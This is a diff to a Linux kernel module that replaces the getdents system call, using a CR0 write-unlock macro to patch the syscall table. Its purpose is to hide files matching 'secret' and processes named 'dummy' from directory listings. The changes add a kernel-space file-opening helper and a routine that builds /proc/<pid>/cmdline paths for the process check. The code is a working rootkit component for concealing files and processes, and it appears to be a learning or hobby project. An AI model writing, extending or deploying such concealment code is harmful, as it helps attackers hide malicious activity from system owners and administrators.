@@ -10,6 +10,8 @@
 #include <linux/dirent.h>
 #include <linux/fs.h>
 #include <asm/uaccess.h>
+#include <asm/segment.h>
+#include <linux/buffer_head.h>
 
 
 #define CR0_WRITE_UNLOCK(x) \
@@ -64,8 +66,34 @@ struct linux_dirent {
 	char d_name[];
 };
 
-#define hide_file "hide"
-#define hide_process "dummy"
+struct file *file_open(const char * path, int flags, int rights) {
+	struct file *filp = NULL;
+	mm_segment_t oldfs;
+	int err = 0;
+	oldfs = get_fs();
+	set_fs(get_ds());
+	filp = filp_open(path, flags, rights);
+	set_fs(oldfs);
+	if (IS_ERR(filp)) {
+		err = PTR_ERR(filp);
+		return NULL;
+	}
+	return filp;
+}
+#define BUF_SIZE 128
+
+char * get_cmdline_path(char * buf, char * pid) {
+	int i = 0;
+	for (i = 0; i < BUF_SIZE; i++)
+		buf[i] = 0;
+	strcat( buf, "/proc/" );
+	strcat( buf, pid);
+	strcat( buf, "/cmdline" );
+	return buf;
+}
+
+#define HIDE_FILE "secret"
+#define HIDE_PROCESS "dummy"
 
 asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp, unsigned int count) {
 	pr_info("FAKEGETDENTS: Intercepted getdents of fd=%d %p %d\n", fd, dirp, count);
@@ -97,19 +125,16 @@ asmlinkage long totallyReal_getdents(unsigned int fd, struct linux_dirent * dirp
 		unsigned short p_dirent_len = p_dirp->d_reclen;
 		
 		struct file *f;
-		char buf[128];
-		mm_segment_t fs;
+		char buf[BUF_SIZE];
 		int i = 0;
 		for (i = 0; i < 128; i++)
 			buf[i] = 0;
 		char filename[128];
-		strcpy( filename, buf );
-		strcat( filename, "/proc/" );
-		strcat( filename, p_dirp->d_name);
-		strcat( filename, "/cmdline" );
+		get_cmdline_path( filename, p_dirp->d_name);
 		pr_info("FAKEGETDENTS: filename is: %s", filename);
 
-		if (strstr(p_dirp->d_name, hide_file) != NULL ) {
+
+		if (strstr(p_dirp->d_name, HIDE_FILE) != NULL ) {
 			if (p_dirp == mod_dirp) {
 				pr_info("FAKEGETDENTS: hiding %s", p_dirp->d_name);
 				nread -= p_dirent_len;
